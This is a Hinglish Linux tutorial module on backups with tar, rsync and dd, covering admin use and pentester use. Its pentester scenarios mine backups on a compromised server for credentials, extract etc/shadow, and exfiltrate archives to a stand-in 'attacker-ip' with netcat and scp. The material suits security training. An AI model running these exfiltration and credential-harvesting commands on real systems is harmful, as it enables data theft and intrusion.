# **Module 10: Backup & Restore Strategies** ğŸ’¾ğŸ”„

---

## **Topic 1: Backup Strategies (tar, rsync, dd)** ğŸ“¦

---

### **1ï¸âƒ£ Topic Summary (1-2 lines)**

Backup strategies Linux mein data loss se bachne aur disaster recovery ke liye essential hain - tar archives banata hai, rsync incremental sync karta hai, aur dd bit-by-bit disk cloning karta hai.

---

### **2ï¸âƒ£ Detailed Explanation with Analogy** ğŸ§ 

**Kya hai Backup?**

Backup matlab apne important data ki copy banana taaki agar original data corrupt ho jaye, delete ho jaye, ya system crash ho jaye, toh aap data recover kar sako.

**3 Main Backup Tools:**

1. **tar (Tape Archive)** - Files aur directories ko ek single archive file mein compress karke store karta hai
2. **rsync (Remote Sync)** - Files ko efficiently sync karta hai, sirf changes copy karta hai
3. **dd (Disk Dump)** - Complete disk ya partition ka bit-by-bit clone banata hai

**Analogy:**

- **tar** = Apne kapde ek suitcase mein pack karna - sab kuch ek jagah compressed
- **rsync** = Sirf woh kapde pack karna jo pehle se packed nahi hain - efficient aur fast
- **dd** = Poora wardrobe ka exact photocopy banana - har cheez bilkul same position mein

---

### **3ï¸âƒ£ Why is this Important?** ğŸ¯

**Sysadmin Perspective:**
- Data loss se protection (hardware failure, human error)
- Disaster recovery planning
- System migration aur upgrades
- Compliance requirements (data retention policies)
- Quick restoration in case of ransomware attacks

**Pentester Perspective:**
- Target system ka backup analyze karke sensitive data dhundna
- Backup files mein credentials aur config files
- Backup locations often weak permissions rakhte hain
- Old backups mein outdated software versions (vulnerable)
- Backup exfiltration for offline analysis

---

### **4ï¸âƒ£ Real-World Use Cases** ğŸ’¼

**Admin Use Cases:**
1. Daily website backup before updates
2. Database backup before schema changes
3. Complete server backup before OS upgrade
4. User home directories ka weekly backup
5. Configuration files ka version control

**Pentester Use Cases:**
1. Backup directories mein sensitive files search karna
2. `.tar.gz` files download karke offline analysis
3. Backup scripts mein hardcoded credentials
4. World-readable backup files exploit karna
5. Old backups mein unpatched vulnerabilities

---

### **5ï¸âƒ£ Consequences of Not Knowing** âš ï¸

**Admin Problems:**
- âŒ Data loss se permanent damage
- âŒ Downtime increase (no quick recovery)
- âŒ Business continuity failure
- âŒ Compliance violations aur legal issues
- âŒ Customer trust loss

**Pentester Problems:**
- âŒ Easy data exfiltration opportunities miss karna
- âŒ Backup files mein credentials overlook karna
- âŒ Persistence mechanisms miss karna
- âŒ Sensitive data discovery incomplete
- âŒ Post-exploitation phase weak

---

### **6ï¸âƒ£ Syntax & Command Structure** ğŸ“

#### **tar Command:**
```bash
tar [options] [archive-name] [files/directories]

Common Options:
c - Create archive
x - Extract archive
t - List contents
v - Verbose output
f - Specify filename
z - Compress with gzip
j - Compress with bzip2
```

#### **rsync Command:**
```bash
rsync [options] source destination

Common Options:
-a - Archive mode (preserve permissions, timestamps)
-v - Verbose
-z - Compress during transfer
-r - Recursive
-h - Human-readable
--delete - Delete files in destination not in source
--progress - Show progress
```

#### **dd Command:**
```bash
dd if=input of=output [options]

Common Options:
if= - Input file
of= - Output file
bs= - Block size
count= - Number of blocks
status=progress - Show progress
```

---

### **7ï¸âƒ£ Detailed Examples with Explanation Tables** ğŸ’»

#### **Example 1: tar - Basic Archive Creation**

```bash
tar -czvf website_backup.tar.gz /var/www/html/
```

| Part | Explanation |
|------|-------------|
| `tar` | Archive utility command |
| `-c` | Create new archive |
| `-z` | Compress with gzip |
| `-v` | Verbose (show files being archived) |
| `-f` | Specify filename |
| `website_backup.tar.gz` | Output archive name |
| `/var/www/html/` | Directory to backup |

**Output:**
```
/var/www/html/
/var/www/html/index.html
/var/www/html/style.css
/var/www/html/images/
/var/www/html/images/logo.png
```

---

#### **Example 2: tar - Extract Archive**

```bash
tar -xzvf website_backup.tar.gz -C /tmp/restore/
```

| Part | Explanation |
|------|-------------|
| `tar` | Archive utility |
| `-x` | Extract files |
| `-z` | Decompress gzip |
| `-v` | Verbose output |
| `-f` | Specify filename |
| `website_backup.tar.gz` | Archive to extract |
| `-C /tmp/restore/` | Extract to specific directory |

---

#### **Example 3: tar - List Archive Contents (Pentester Recon)**

```bash
tar -tzf backup.tar.gz | grep -E "\.conf$|\.key$|\.pem$"
```

| Part | Explanation |
|------|-------------|
| `tar -tzf` | List contents of gzip archive |
| `backup.tar.gz` | Archive file |
| `\|` | Pipe to grep |
| `grep -E` | Extended regex search |
| `"\.conf$\|\.key$\|\.pem$"` | Find config/key files |

**Output:**
```
etc/nginx/nginx.conf
etc/ssh/sshd_config
home/admin/.ssh/id_rsa.key
etc/ssl/private/server.pem
```

---

#### **Example 4: rsync - Local Directory Sync**

```bash
rsync -avh --progress /home/user/documents/ /backup/documents/
```

| Part | Explanation |
|------|-------------|
| `rsync` | Remote sync command |
| `-a` | Archive mode (preserve everything) |
| `-v` | Verbose |
| `-h` | Human-readable sizes |
| `--progress` | Show transfer progress |
| `/home/user/documents/` | Source (trailing slash = contents) |
| `/backup/documents/` | Destination |

**Output:**
```
sending incremental file list
report.pdf
    2.45M 100%   45.23MB/s    0:00:00
presentation.pptx
    5.12M 100%   38.91MB/s    0:00:00

sent 7.58M bytes  received 54 bytes  15.16M bytes/sec
```

---

#### **Example 5: rsync - Remote Backup over SSH**

```bash
rsync -avz -e ssh /var/www/html/ user@backup-server:/backups/website/
```

| Part | Explanation |
|------|-------------|
| `rsync` | Sync command |
| `-a` | Archive mode |
| `-v` | Verbose |
| `-z` | Compress during transfer |
| `-e ssh` | Use SSH for transfer |
| `/var/www/html/` | Local source |
| `user@backup-server:` | Remote host |
| `/backups/website/` | Remote destination |

---

#### **Example 6: rsync - Incremental Backup with Delete**

```bash
rsync -avh --delete --progress /data/ /backup/data/
```

| Part | Explanation |
|------|-------------|
| `--delete` | Delete files in dest not in source |
| Other options | Same as previous |

**Use Case:** Mirror exact copy - agar source se file delete hui, backup se bhi delete ho jayegi.

---

#### **Example 7: dd - Disk Cloning**

```bash
dd if=/dev/sda of=/dev/sdb bs=4M status=progress
```

| Part | Explanation |
|------|-------------|
| `dd` | Disk dump command |
| `if=/dev/sda` | Input file (source disk) |
| `of=/dev/sdb` | Output file (destination disk) |
| `bs=4M` | Block size 4 megabytes |
| `status=progress` | Show progress |

**Output:**
```
2147483648 bytes (2.1 GB, 2.0 GiB) copied, 45 s, 47.7 MB/s
```

**âš ï¸ Warning:** dd bahut powerful hai - wrong command se poora disk wipe ho sakta hai!

---

#### **Example 8: dd - Create Disk Image**

```bash
dd if=/dev/sda of=/backup/disk_image.img bs=4M status=progress
```

| Part | Explanation |
|------|-------------|
| `if=/dev/sda` | Source disk |
| `of=/backup/disk_image.img` | Output image file |
| `bs=4M` | 4MB block size (faster) |
| `status=progress` | Show progress |

**Use Case:** Forensics, system migration, complete backup

---

#### **Example 9: dd - Restore from Image**

```bash
dd if=/backup/disk_image.img of=/dev/sda bs=4M status=progress
```

**Reverse process** - Image file se disk restore karna.

---

#### **Example 10: tar with Exclusions**

```bash
tar -czvf backup.tar.gz --exclude='*.log' --exclude='cache/*' /var/www/
```

| Part | Explanation |
|------|-------------|
| `--exclude='*.log'` | Skip all .log files |
| `--exclude='cache/*'` | Skip cache directory |
| `/var/www/` | Source directory |

**Output:** Backup without unnecessary files (logs, cache).

---

### **8ï¸âƒ£ Common Mistakes & How to Avoid** âŒâ¡ï¸âœ…

| Mistake | Problem | Solution |
|---------|---------|----------|
| `tar -czf backup.tar.gz /` | Root backup without exclusions | Use `--exclude` for `/proc`, `/sys`, `/dev` |
| `dd if=/dev/sda of=/dev/sda` | Overwriting source disk | Double-check if/of parameters |
| `rsync /source /dest` | Missing trailing slash | `/source/` copies contents, `/source` copies folder |
| No backup verification | Corrupt backups undetected | Always test restore process |
| Backups on same disk | Disk failure = backup loss | Store backups on separate media |
| World-readable backups | Security risk | `chmod 600 backup.tar.gz` |
| No compression | Wasted space | Use `-z` with tar, rsync |
| Forgetting `-a` in rsync | Permissions lost | Always use `-a` for archive mode |

---

### **9ï¸âƒ£ Best Practices & Pro Tips** â­

**Admin Best Practices:**
1. âœ… **3-2-1 Rule**: 3 copies, 2 different media, 1 offsite
2. âœ… **Test Restores**: Monthly restore testing
3. âœ… **Automate**: Cron jobs for scheduled backups
4. âœ… **Encrypt**: Sensitive data backups encrypted
5. âœ… **Document**: Backup procedures documented
6. âœ… **Monitor**: Backup success/failure alerts
7. âœ… **Retention**: Define retention policies (daily/weekly/monthly)
8. âœ… **Incremental**: Use rsync for large datasets

**Pentester Pro Tips:**
1. ğŸ” **Search Common Locations**: `/backup/`, `/var/backups/`, `/tmp/`
2. ğŸ” **Check Permissions**: `find / -name "*.tar.gz" -readable 2>/dev/null`
3. ğŸ” **Analyze Backup Scripts**: Often contain credentials
4. ğŸ” **Old Backups**: May have outdated vulnerable configs
5. ğŸ” **Backup Timing**: Cron jobs reveal backup schedules
6. ğŸ” **Extract Selectively**: `tar -xzf backup.tar.gz etc/shadow`
7. ğŸ” **Network Shares**: NFS/SMB backup shares often misconfigured
8. ğŸ” **Cloud Backups**: S3 buckets with weak permissions

---

### **ğŸ”Ÿ Real-World Scenarios** ğŸŒ

#### **Scenario 1: Website Backup Before Update (Admin)**

**Situation:** Production website update karna hai, rollback option chahiye.

**Solution:**
```bash
# Full backup with timestamp
DATE=$(date +%Y%m%d_%H%M%S)
tar -czvf /backups/website_${DATE}.tar.gz /var/www/html/

# Database backup
mysqldump -u root -p website_db > /backups/db_${DATE}.sql

# Verify backup
tar -tzf /backups/website_${DATE}.tar.gz | head -10
ls -lh /backups/
```

**Result:** Agar update fail ho, 5 minutes mein restore kar sakte ho.

---

#### **Scenario 2: Incremental Backup with rsync (Admin)**

**Situation:** 500GB data daily backup karna hai, but bandwidth limited hai.

**Solution:**
```bash
# First full backup
rsync -avz /data/ backup-server:/backups/data/

# Daily incremental (only changes)
rsync -avz --delete /data/ backup-server:/backups/data/

# Bandwidth limit (10MB/s)
rsync -avz --bwlimit=10000 /data/ backup-server:/backups/data/
```

**Result:** Pehla backup 8 hours, daily backup sirf 15 minutes.

---

#### **Scenario 3: Finding Sensitive Data in Backups (Pentester)**

**Situation:** Web server compromise kiya, backup files accessible hain.

**Attack:**
```bash
# Find backup files
find /var/backups -type f -name "*.tar.gz" 2>/dev/null

# List contents without extracting
tar -tzf /var/backups/old_website.tar.gz | grep -i "config\|password\|key"

# Extract specific files
mkdir /tmp/.hidden
tar -xzf /var/backups/old_website.tar.gz -C /tmp/.hidden/ etc/mysql/my.cnf

# Check for credentials
cat /tmp/.hidden/etc/mysql/my.cnf | grep password
```

**Finding:**
```
[client]
user=root
password=OldP@ssw0rd123
```

**Impact:** Old password se database access, privilege escalation.

---

#### **Scenario 4: Disk Cloning for Forensics (Admin/Pentester)**

**Situation:** Compromised server ka forensic analysis karna hai without disturbing original.

**Solution:**
```bash
# Create bit-by-bit image
dd if=/dev/sda of=/forensics/server_image.dd bs=4M status=progress

# Calculate hash for integrity
sha256sum /forensics/server_image.dd > /forensics/server_image.sha256

# Mount image for analysis
mkdir /mnt/forensics
mount -o loop,ro /forensics/server_image.dd /mnt/forensics

# Analyze without modifying original
grep -r "malware" /mnt/forensics/var/www/
```

**Result:** Original system untouched, complete analysis possible.

---

#### **Scenario 5: Backup Exfiltration (Pentester)**

**Situation:** Target server pe backup files hain, exfiltrate karna hai.

**Attack:**
```bash
# Find recent backups
find / -name "*.tar.gz" -mtime -7 2>/dev/null

# Check size
ls -lh /var/backups/app_backup.tar.gz
# Output: 45M

# Exfiltrate via netcat
# Attacker machine:
nc -lvp 4444 > app_backup.tar.gz

# Target machine:
nc attacker-ip 4444 < /var/backups/app_backup.tar.gz

# Or via SCP
scp /var/backups/app_backup.tar.gz attacker@attacker-ip:/tmp/
```

**Result:** Offline analysis of complete application code and configs.

---

### **1ï¸âƒ£1ï¸âƒ£ Checklist for Implementation** âœ…

**Admin Checklist:**
- [ ] Backup strategy defined (full/incremental/differential)
- [ ] Backup schedule created (daily/weekly/monthly)
- [ ] Backup location secured (permissions, encryption)
- [ ] Offsite backup configured
- [ ] Restore procedure tested
- [ ] Backup monitoring setup
- [ ] Retention policy implemented
- [ ] Documentation updated
- [ ] Team trained on restore process
- [ ] Backup logs reviewed regularly

**Pentester Checklist:**
- [ ] Common backup locations enumerated
- [ ] Backup file permissions checked
- [ ] Backup scripts analyzed for credentials
- [ ] Old backups searched for vulnerabilities
- [ ] Backup timing/schedule identified
- [ ] Network backup shares enumerated
- [ ] Cloud backup misconfigurations checked
- [ ] Backup exfiltration feasibility assessed
- [ ] Sensitive data in backups documented
- [ ] Findings reported with remediation

---

### **1ï¸âƒ£2ï¸âƒ£ Frequently Asked Questions (FAQs)** â“

**Q1: tar vs rsync - Kab kya use karein?**
**A:** tar for complete archives (one-time backups, transfers), rsync for incremental syncing (regular backups, large datasets).

**Q2: dd command dangerous kyun hai?**
**A:** dd koi confirmation nahi maangta - wrong parameters se poora disk wipe ho sakta hai. Always double-check if/of.

**Q3: Backup ko encrypt kaise karein?**
**A:** 
```bash
# tar with encryption
tar -czf - /data | openssl enc -aes-256-cbc -e > backup.tar.gz.enc

# Decrypt
openssl enc -aes-256-cbc -d -in backup.tar.gz.enc | tar -xzf -
```

**Q4: rsync mein trailing slash ka kya matlab?**
**A:** 
- `/source/` = source ke contents copy honge
- `/source` = source folder itself copy hoga

**Q5: Backup verification kyun important hai?**
**A:** Corrupt backups se restore nahi ho sakta - regular testing ensures backup actually works.

**Q6: Incremental vs Differential backup?**
**A:** 
- Incremental: Last backup ke baad ke changes
- Differential: Last full backup ke baad ke changes

**Q7: Backup ko secure kaise rakhein?**
**A:** 
```bash
chmod 600 backup.tar.gz
chown root:root backup.tar.gz
# Store in restricted directory
mv backup.tar.gz /root/backups/
```

**Q8: Remote backup slow hai, kaise speed up karein?**
**A:** 
```bash
# Compression + bandwidth limit
rsync -avz --bwlimit=5000 --compress-level=9 source/ dest/
```

---

### **1ï¸âƒ£3ï¸âƒ£ Practice Tasks with Expected Output** ğŸ¯

#### **Task 1: Create Website Backup**
```bash
# Create test website
sudo mkdir -p /var/www/testsite
echo "Test Page" | sudo tee /var/www/testsite/index.html

# Create backup
sudo tar -czvf /tmp/testsite_backup.tar.gz /var/www/testsite/

# Verify
tar -tzf /tmp/testsite_backup.tar.gz
```

**Expected Output:**
```
var/www/testsite/
var/www/testsite/index.html
```

---

#### **Task 2: rsync Local Sync**
```bash
# Create source directory
mkdir -p ~/source/docs
echo "Document 1" > ~/source/docs/file1.txt
echo "Document 2" > ~/source/docs/file2.txt

# Sync to backup
rsync -avh ~/source/ ~/backup/

# Verify
ls -la ~/backup/docs/
```

**Expected Output:**
```
total 16
drwxrwxr-x 2 user user 4096 Jan 15 10:30 .
drwxrwxr-x 3 user user 4096 Jan 15 10:30 ..
-rw-rw-r-- 1 user user   11 Jan 15 10:30 file1.txt
-rw-rw-r-- 1 user user   11 Jan 15 10:30 file2.txt
```

---

#### **Task 3: Find Backup Files (Pentester)**
```bash
# Search for backup files
find /var -name "*.tar.gz" -o -name "*.bak" 2>/dev/null

# Check permissions
find /var -name "*.tar.gz" -readable 2>/dev/null -exec ls -lh {} \;
```

**Expected Output:**
```
-rw-r--r-- 1 root root 2.3M Jan 14 02:00 /var/backups/website.tar.gz
-rw-rw-r-- 1 www-data www-data 1.5M Jan 13 03:00 /var/www/backup.tar.gz
```

---

#### **Task 4: Extract Specific Files from Archive**
```bash
# List archive contents
tar -tzf backup.tar.gz | grep "\.conf$"

# Extract only config files
tar -xzf backup.tar.gz --wildcards "*.conf"

# Verify extraction
find . -name "*.conf"
```

---

#### **Task 5: Create Encrypted Backup**
```bash
# Create encrypted backup
tar -czf - ~/documents | openssl enc -aes-256-cbc -e -out ~/secure_backup.tar.gz.enc

# Test decryption
openssl enc -aes-256-cbc -d -in ~/secure_backup.tar.gz.enc | tar -tzf - | head -5
```

**Expected:** Password prompt, then file listing.

---

### **1ï¸âƒ£4ï¸âƒ£ Advanced Information & Edge Cases** ğŸš€

#### **Advanced Technique 1: Incremental Backups with tar**

```bash
# Full backup with snapshot
tar -czvf full_backup.tar.gz -g snapshot.snar /data/

# Incremental backup (only changes)
tar -czvf incremental_backup.tar.gz -g snapshot.snar /data/

# Restore process
tar -xzvf full_backup.tar.gz -g /dev/null
tar -xzvf incremental_backup.tar.gz -g /dev/null
```

**Use Case:** Space-efficient backups for large datasets.

---

#### **Advanced Technique 2: rsync with Hardlinks (Snapshot Backups)**

```bash
# First backup
rsync -a /data/ /backup/2024-01-15/

# Second backup with hardlinks (unchanged files linked)
rsync -a --link-dest=/backup/2024-01-15/ /data/ /backup/2024-01-16/
```

**Result:** Multiple "full" backups but space usage minimal (hardlinks for unchanged files).

---

#### **Advanced Technique 3: dd with Compression**

```bash
# Compress while imaging
dd if=/dev/sda bs=4M status=progress | gzip > disk_image.img.gz

# Restore
gunzip -c disk_image.img.gz | dd of=/dev/sda bs=4M status=progress
```

---

#### **Advanced Technique 4: Network Backup over SSH Tunnel**

```bash
# Backup to remote server through SSH
tar -czf - /data | ssh user@backup-server "cat > /backups/data.tar.gz"

# Restore from remote
ssh user@backup-server "cat /backups/data.tar.gz" | tar -xzf -
```

---

#### **Edge Case 1: Sparse Files**

```bash
# Backup sparse files efficiently
tar -czvSf backup.tar.gz /path/to/sparse/files

# rsync preserve sparse
rsync -avS /source/ /dest/
```

**Why:** Sparse files (like VM images) have "holes" - S option preserves them.

---

#### **Edge Case 2: Backup Running Databases**

```bash
# Wrong way (inconsistent backup)
tar -czf db_backup.tar.gz /var/lib/mysql/

# Right way (consistent snapshot)
mysqldump --all-databases > all_databases.sql
tar -czf db_backup.tar.gz all_databases.sql
```

---

#### **Edge Case 3: Backup with ACLs and Extended Attributes**

```bash
# Preserve ACLs
tar --acls --xattrs -czf backup.tar.gz /data/

# rsync with ACLs
rsync -aAX /source/ /dest/
```

---

### **1ï¸âƒ£5ï¸âƒ£ Final Summary & Key Takeaways** ğŸ“Œ

**Key Concepts:**
1. **tar** - Archive creation, compression, extraction
2. **rsync** - Efficient incremental syncing
3. **dd** - Bit-level disk cloning
4. **Backup Strategy** - 3-2-1 rule (3 copies, 2 media, 1 offsite)
5. **Security** - Encrypt backups, restrict permissions

**Critical Commands:**
```bash
# tar backup
tar -czvf backup.tar.gz /path/

# rsync sync
rsync -avz /source/ /dest/

# dd clone
dd if=/dev/sda of=image.img bs=4M status=progress
```

**Admin Takeaways:**
- âœ… Regular automated backups essential
- âœ… Test restore procedures monthly
- âœ… Secure backup storage (permissions + encryption)
- âœ… Offsite backups for disaster recovery
- âœ… Document backup/restore procedures

**Pentester Takeaways:**
- ğŸ” Backup files = goldmine of sensitive data
- ğŸ” Check `/var/backups/`, `/backup/`, `/tmp/`
- ğŸ” Old backups may have outdated credentials
- ğŸ” Backup scripts often contain hardcoded passwords
- ğŸ” Weak permissions on backups = easy wins

**Remember:**
- Backup without testing = false security
- Encryption protects data at rest
- Incremental backups save time and space
- Always verify backup integrity
- Document everything for disaster recovery

**Next Topic:** Automated Backups with Cron ğŸ•

---

**Happy Backing Up! ğŸ’¾ğŸ”**
